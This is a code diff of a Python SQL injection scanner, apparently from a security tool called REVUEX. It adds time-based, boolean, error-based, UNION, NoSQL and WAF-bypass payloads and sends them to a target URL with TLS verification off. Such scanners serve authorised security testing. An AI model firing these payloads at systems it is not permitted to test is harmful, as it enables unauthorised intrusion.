@@ -18,8 +18,8 @@ import re
 from pathlib import Path
 from typing import List, Dict, Any, Optional
 from urllib.parse import urlparse, urlencode
+import hashlib
 
-requests.packages.urllib3.disable_warnings()
 
 class EnhancedSQLiScanner:
     """
@@ -47,64 +47,78 @@ class EnhancedSQLiScanner:
         self.timeout = 10
 
         self.headers = {
-            "User-Agent": "REVUEX-SQLiScanner/1.0",
-            "Accept": "*/*"
+            "User-Agent": "REVUEX-SQLiScanner/1.0 (Security Research; +https://github.com/G33L0)",
+            "Accept": "*/*",
         }
 
         self.vulnerabilities: List[Dict[str, Any]] = []
         self.detected_dbms: Optional[str] = None
 
-        # === PAYLOAD DEFINITIONS (UNCHANGED LOGIC) ===
+        # ---------- PAYLOADS (UNMODIFIED LOGIC) ----------
 
         self.time_based_payloads = {
             "mysql": [
                 "' AND SLEEP(5)--",
-                "' AND BENCHMARK(5000000,MD5('A'))--"
+                "' AND BENCHMARK(5000000,MD5('A'))--",
+                "1' AND SLEEP(5)#",
+                "' OR SLEEP(5)--",
             ],
             "postgresql": [
                 "'; SELECT pg_sleep(5)--",
-                "' AND pg_sleep(5)--"
+                "' AND pg_sleep(5)--",
+                "1' AND pg_sleep(5)--",
             ],
             "mssql": [
                 "'; WAITFOR DELAY '00:00:05'--",
-                "1'; WAITFOR DELAY '00:00:05'--"
+                "1'; WAITFOR DELAY '00:00:05'--",
             ],
             "oracle": [
-                "' AND DBMS_LOCK.SLEEP(5)--"
+                "' AND DBMS_LOCK.SLEEP(5)--",
             ],
             "sqlite": [
-                "' AND randomblob(100000000)--"
-            ]
+                "' AND randomblob(100000000)--",
+            ],
         }
 
         self.boolean_payloads = {
-            "true": ["' OR 1=1--", "' OR 'a'='a"],
-            "false": ["' OR 1=2--", "' OR 'a'='b"]
+            "true": [
+                "' OR '1'='1",
+                "' OR 1=1--",
+                "' OR 'a'='a",
+            ],
+            "false": [
+                "' OR '1'='2",
+                "' OR 1=2--",
+                "' OR 'a'='b",
+            ],
         }
 
         self.error_based_payloads = [
             "' AND extractvalue(1,concat(0x7e,version()))--",
             "' AND updatexml(1,concat(0x7e,version()),1)--",
             "' AND 1=CAST(version() AS INT)--",
-            "' AND 1=CONVERT(INT,@@version)--"
+            "' AND 1=CONVERT(INT,@@version)--",
+            "' AND TO_NUMBER(version)=1--",
         ]
 
         self.union_payloads = [
             "' UNION SELECT NULL--",
             "' UNION SELECT NULL,NULL--",
-            "' UNION SELECT 1,2,3--"
+            "' UNION SELECT NULL,NULL,NULL--",
+            "' UNION ALL SELECT NULL--",
         ]
 
         self.nosql_payloads = [
             "{'$gt':''}",
             "{'$ne':''}",
-            "admin' || '1'=='1"
+            "admin' || '1'=='1",
         ]
 
         self.waf_bypasses = [
             "'/**/AND/**/1=1--",
-            "'/*!50000AND*/1=1--",
-            "%27%20AND%201=1--"
+            "'AnD 1=1--",
+            "%27%20AND%201=1--",
+            "'\t AND\t1=1--",
         ]
 
         self.fingerprint_queries = {
@@ -112,16 +126,17 @@ class EnhancedSQLiScanner:
             "postgresql": "' AND version()--",
             "mssql": "' AND @@version--",
             "oracle": "' AND banner FROM v$version--",
-            "sqlite": "' AND sqlite_version()--"
+            "sqlite": "' AND sqlite_version()--",
         }
 
-    # ================= MAIN SCAN =================
+    # ================== CORE SCAN ==================
 
     def scan(self) -> List[Dict[str, Any]]:
         print("\n" + "=" * 60)
         print("💉 REVUEX Enhanced SQLi Scanner")
         print("=" * 60)
         print(f"Target: {self.target}")
+        print(f"Delay: {self.delay}s")
         print(f"Max Requests: {self.max_requests}")
         print("=" * 60)
 
@@ -140,27 +155,28 @@ class EnhancedSQLiScanner:
         self._test_union_based()
         time.sleep(self.delay)
 
-        self._test_nosql_injection()
+        self._test_nosql()
         time.sleep(self.delay)
 
-        self._test_waf_bypasses()
+        self._test_waf_bypass()
 
         self._save_results()
 
-        print("\n✅ Scan Complete")
-        print(f"Vulnerabilities Found: {len(self.vulnerabilities)}")
-        print(f"Requests Used: {self.request_count}/{self.max_requests}")
+        print("\n" + "=" * 60)
+        print("✅ Scan Complete")
+        print(f"Vulnerabilities: {len(self.vulnerabilities)}")
+        print(f"Requests: {self.request_count}/{self.max_requests}")
         if self.detected_dbms:
             print(f"Detected DBMS: {self.detected_dbms}")
+        print("=" * 60)
 
         return self.vulnerabilities
 
-    # ================= CORE TESTS =================
+    # ================== HELPERS ==================
 
     def _make_request(self, payload: str) -> Optional[requests.Response]:
         if self.request_count >= self.max_requests:
             return None
-
         try:
             if "?" in self.target:
                 url = self.target + "&" + urlencode({"id": payload})
@@ -171,151 +187,157 @@ class EnhancedSQLiScanner:
                 url,
                 headers=self.headers,
                 timeout=self.timeout,
-                verify=False
+                verify=False,
+                allow_redirects=True,
             )
-
             self.request_count += 1
             return response
         except Exception:
             return None
 
     def _fingerprint_database(self):
-        print("\n🔍 Fingerprinting DBMS...")
         for dbms, payload in self.fingerprint_queries.items():
             response = self._make_request(payload)
             if response:
                 text = response.text.lower()
                 if dbms in text:
-                    self.detected_dbms = dbms.upper()
-                    print(f"   ✓ Detected DBMS: {self.detected_dbms}")
+                    self.detected_dbms = dbms
+                    print(f"[+] DBMS detected: {dbms}")
                     return
             time.sleep(self.delay)
-        print("   ℹ️ DBMS not detected")
 
     def _test_time_based_blind(self):
-        print("\n⏱️ Time-Based Blind SQLi")
         for dbms, payloads in self.time_based_payloads.items():
             for payload in payloads:
                 start = time.time()
                 baseline = self._make_request("")
                 if not baseline:
                     continue
-                base_time = time.time() - start
+                baseline_time = time.time() - start
 
                 start = time.time()
-                injected = self._make_request(payload)
-                if not injected:
-                    continue
-                injected_time = time.time() - start
+                response = self._make_request(payload)
+                response_time = time.time() - start
 
-                if injected_time - base_time > 4:
+                if response_time > baseline_time + 4:
                     self.vulnerabilities.append({
-                        "type": "Time-Based Blind SQL Injection",
-                        "severity": "critical",
+                        "type": "SQLi Time-Based Blind",
                         "dbms": dbms,
                         "payload": payload,
-                        "baseline_time": base_time,
-                        "response_time": injected_time
+                        "delay": response_time,
                     })
-                    print(f"   ✓ Vulnerable ({dbms})")
+                    print(f"[!] Time-based SQLi detected ({dbms})")
                     return
 
     def _test_boolean_based(self):
-        print("\n🔀 Boolean-Based SQLi")
-        t = self._make_request(self.boolean_payloads["true"][0])
-        f = self._make_request(self.boolean_payloads["false"][0])
-        if t and f and abs(len(t.text) - len(f.text)) > 100:
-            self.vulnerabilities.append({
-                "type": "Boolean-Based Blind SQL Injection",
-                "severity": "critical"
-            })
-            print("   ✓ Boolean SQLi confirmed")
+        true_len = []
+        false_len = []
+
+        for p in self.boolean_payloads["true"]:
+            r = self._make_request(p)
+            if r:
+                true_len.append(len(r.text))
+            time.sleep(self.delay)
+
+        for p in self.boolean_payloads["false"]:
+            r = self._make_request(p)
+            if r:
+                false_len.append(len(r.text))
+            time.sleep(self.delay)
+
+        if true_len and false_len:
+            if abs(sum(true_len) - sum(false_len)) > 100:
+                self.vulnerabilities.append({
+                    "type": "SQLi Boolean-Based Blind",
+                    "true_len": true_len,
+                    "false_len": false_len,
+                })
+                print("[!] Boolean-based SQLi detected")
 
     def _test_error_based(self):
-        print("\n❌ Error-Based SQLi")
         for payload in self.error_based_payloads:
-            response = self._make_request(payload)
-            if response and self._check_sql_error(response.text):
+            r = self._make_request(payload)
+            if r and self._has_sql_error(r.text):
                 self.vulnerabilities.append({
-                    "type": "Error-Based SQL Injection",
-                    "severity": "critical",
-                    "payload": payload
+                    "type": "SQLi Error-Based",
+                    "payload": payload,
                 })
-                print("   ✓ Error-based SQLi found")
+                print("[!] Error-based SQLi detected")
                 return
 
     def _test_union_based(self):
-        print("\n🔗 UNION-Based SQLi")
         for payload in self.union_payloads:
-            response = self._make_request(payload)
-            if response and response.status_code == 200:
+            r = self._make_request(payload)
+            if r and r.status_code == 200:
                 self.vulnerabilities.append({
-                    "type": "UNION-Based SQL Injection",
-                    "severity": "critical",
-                    "payload": payload
+                    "type": "SQLi UNION-Based",
+                    "payload": payload,
                 })
-                print("   ✓ UNION SQLi confirmed")
+                print("[!] UNION-based SQLi detected")
                 return
 
-    def _test_nosql_injection(self):
-        print("\n📊 NoSQL Injection")
+    def _test_nosql(self):
         for payload in self.nosql_payloads:
-            response = self._make_request(payload)
-            if response and response.status_code == 200:
+            r = self._make_request(payload)
+            if r and r.status_code == 200:
                 self.vulnerabilities.append({
                     "type": "NoSQL Injection",
-                    "severity": "high",
-                    "payload": payload
+                    "payload": payload,
                 })
-                print("   ✓ NoSQL injection possible")
+                print("[!] NoSQL injection detected")
                 return
 
-    def _test_waf_bypasses(self):
-        print("\n🛡️ WAF Bypass Techniques")
+    def _test_waf_bypass(self):
         for payload in self.waf_bypasses:
-            response = self._make_request(payload)
-            if response and response.status_code != 403:
+            r = self._make_request(payload)
+            if r and r.status_code != 403:
                 self.vulnerabilities.append({
-                    "type": "SQL Injection - WAF Bypass",
-                    "severity": "high",
-                    "payload": payload
+                    "type": "WAF Bypass",
+                    "payload": payload,
                 })
-                print("   ✓ WAF bypass successful")
+                print("[!] WAF bypass possible")
                 return
 
-    # ================= HELPERS =================
-
-    def _check_sql_error(self, text: str) -> bool:
-        errors = [
-            "sql syntax", "mysql", "postgresql", "ora-", "sqlite", "odbc"
+    def _has_sql_error(self, text: str) -> bool:
+        patterns = [
+            "sql syntax",
+            "mysql",
+            "postgresql",
+            "ora-",
+            "sqlite",
+            "odbc",
         ]
-        text = text.lower()
-        return any(e in text for e in errors)
+        t = text.lower()
+        return any(p in t for p in patterns)
 
     def _save_results(self):
-        output_dir = self.workspace / "sqli_scans"
-        output_dir.mkdir(parents=True, exist_ok=True)
+        out = self.workspace / "sqli_scans"
+        out.mkdir(exist_ok=True)
 
-        safe_target = re.sub(r"[^\w\-]", "_", self.target)
-        output_file = output_dir / f"{safe_target}_sqli.json"
+        safe = re.sub(r"[^\w\-]", "_", self.target)
+        file = out / f"{safe}_sqli.json"
 
-        with open(output_file, "w") as f:
+        with open(file, "w") as f:
             json.dump({
                 "scanner": "EnhancedSQLiScanner",
                 "target": self.target,
                 "dbms": self.detected_dbms,
-                "vulnerabilities": self.vulnerabilities
+                "vulnerabilities": self.vulnerabilities,
             }, f, indent=2)
 
-        print(f"\n💾 Results saved to: {output_file}")
+        print(f"[+] Results saved to {file}")
 
 
 if __name__ == "__main__":
     import sys
 
     if len(sys.argv) < 2:
-        print("Usage: python sqli_scanner.py <target_url>")
+        print("Usage: python enhanced_sqli_scanner.py <target_url>")
         sys.exit(1)
 
-    scanner = EnhancedSQLiScanner(sys.argv[1], Path("revuex_workspace"), delay=5.0)
+    scanner = EnhancedSQLiScanner(
+        sys.argv[1],
+        Path("revuex_workspace"),
+        delay=5.0
+    )
     scanner.scan()
